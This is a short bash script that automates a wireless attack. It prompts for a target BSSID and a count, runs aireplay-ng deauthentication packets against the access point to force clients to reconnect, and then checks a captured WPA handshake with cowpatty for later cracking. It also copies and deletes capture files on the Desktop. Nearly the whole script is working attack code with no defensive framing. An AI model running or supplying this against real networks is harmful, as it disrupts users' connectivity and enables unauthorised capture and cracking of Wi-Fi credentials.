#!/bin/bash

# wireless credentials


iwconfig

echo -n "

Enter the no. of deauths :"

read du

read -p "Enter BSSID :" bs

while read line

do

cp /root/Desktop/$line.cap  /root/Desktop/ehandshake

done </root/Desktop/ehandshake/temp.txt

while read line

do

rm /root/Desktop/$line.*

done </root/Desktop/ehandshake/temp.txt


echo -n "Enter name of your wireless interface. E.g. for wlan0mon enter 0 :"

read in

# starts aireplay-ng

if [ $in -eq 0 ]

then

	
	aireplay-ng --deauth $du -a $bs wlan0mon
	
fi

if [ $in -eq 1 ]

then

	
	aireplay-ng --deauth $du -a $bs wlan1mon
	
fi

if [ $in -eq 2 ]

then


	aireplay-ng --deauth $du -a $bs wlan2mon
	
fi

read -p "Enter the name of the Handshake.cap :" y

cowpatty -c -r /root/Desktop/ehandshake/$y

#restarts network-manager

gnome-terminal -- "./r.sh" --tab-with-profile=exits